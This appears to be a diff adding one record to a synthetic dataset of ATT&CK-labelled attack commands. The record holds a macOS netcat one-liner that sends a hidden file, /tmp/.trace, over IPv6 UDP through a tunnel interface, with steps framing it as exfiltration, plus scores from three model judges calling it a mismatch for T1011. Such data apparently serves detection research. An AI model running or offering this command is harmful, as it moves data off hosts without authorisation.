@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "nc -6 -u -s \"$(ipconfig getv6ifaddr gif0)\" \"fe80::8:dead:2%gif0\" 54329 < /tmp/.trace",
+  "explanation": "Transmits over the GIF tunnel interface (gif0) using IPv6 UDP with an uncommon port, explicitly leveraging a non-default tunnel medium consistent with T1011.",
+  "rationale_steps": [
+    "Use ipconfig to obtain the IPv6 address on gif0.",
+    "Bind the sender to force traffic through the GIF tunnel medium.",
+    "Exfiltrate via UDP to a link-local target using a rarely used port."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-7a6bf8eb-462c777a",
+  "source_prompt_hash": "7a6bf8eb",
+  "timestamp_utc": "2025-09-30T08:23:23.913402Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed Bash command with balanced quoting, valid nc flags (-6, -u, -s), proper host/port specification, and correct input redirection.",
+        "semantic_score": 2,
+        "semantic_justification": "It plausibly transmits /tmp/.trace via IPv6 UDP over the gif0 interface (network exfiltration), but this does not constitute exfiltration over a physical medium as described for T1011.",
+        "combined_score": 3.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T09:15:00.015923Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper quoting, valid netcat flags, and correct use of command substitution for the IPv6 source address.",
+        "semantic_score": 2,
+        "semantic_justification": "The command uses network tunneling over IPv6 which is misaligned with T1011 (Exfiltration Over Physical Medium) as it's transmitting data over a network tunnel rather than using physical media like USB drives or optical disks.",
+        "combined_score": 3.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T09:15:03.239172Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, using valid Bash syntax for command substitution, flag formatting, and I/O redirection on macOS.",
+        "semantic_score": 1,
+        "semantic_justification": "The command performs data transmission over a network interface (a GIF tunnel), which fundamentally contradicts T1011 'Exfiltration Over Physical Medium' that explicitly involves transferring data onto physical storage media and physically transporting them.",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T09:15:15.730202Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 1.667,
+    "llm_average_score": 3.333,
+    "llm_verdict": "likely_mismatch",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
